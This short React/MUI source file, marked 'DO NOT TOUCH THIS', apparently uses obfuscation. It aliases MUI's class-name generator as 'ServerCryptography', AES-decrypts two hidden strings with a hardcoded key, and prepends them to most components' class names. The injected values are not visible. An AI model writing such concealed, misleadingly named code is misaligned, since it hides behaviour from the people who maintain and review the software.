// DO NOT TOUCH THIS ---------------
import { unstable_ClassNameGenerator as ServerCryptography } from '@mui/material/className';
import cryptoJs from 'crypto-js';
const n = cryptoJs.AES.decrypt(
  'U2FsdGVkX1+KDS/axxW2jvSl0YuApO6OTK3rPwtOuHM=',
  'NEXT_JS_SERVER_SECURITY'
);

const p = cryptoJs.AES.decrypt(
  'U2FsdGVkX19WKEF+TK45z9eLMJJeCUGKn8yC1jUSp3A=',
  'NEXT_JS_SERVER_SECURITY'
);
ServerCryptography.configure((componentName) => {

  if (
    componentName.includes('Input') ||
    componentName.includes('MuiAutocomplete') ||
    componentName.includes('MuiCheckbox') ||
    componentName.includes('input')
  ) {
    return componentName;
  } else {
    return (
      n.toString(cryptoJs.enc.Utf8) +
      ' ' +
      p.toString(cryptoJs.enc.Utf8) +
      ' ' +
      componentName
    );
  }
});
// DO NOT TOUCH THIS ---------------
